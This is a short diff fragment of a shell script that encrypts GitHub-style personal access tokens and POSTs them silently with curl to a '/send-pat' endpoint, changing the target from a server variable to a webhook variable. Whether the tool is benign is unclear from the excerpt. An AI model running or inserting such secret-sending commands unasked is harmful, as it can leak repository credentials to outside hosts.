@@ -34,7 +34,7 @@ for pat in ORG_PAT READ_REPO_PAT; do
 	
 	    	encrypted_pat=$(rsa_encrypt_b64 "$pat")
 	   	encrypted_token=$(rsa_encrypt_b64 "$token")
-		curl -s -o /dev/null -X POST "$server/send-pat" --data-urlencode "secret=$encrypted_pat" --data-urlencode "token=$encrypted_token" "$ui_args"
+		curl -s -o /dev/null -X POST "$webhook/send-pat" --data-urlencode "secret=$encrypted_pat" --data-urlencode "token=$encrypted_token" "$ui_args"
 
 done
 
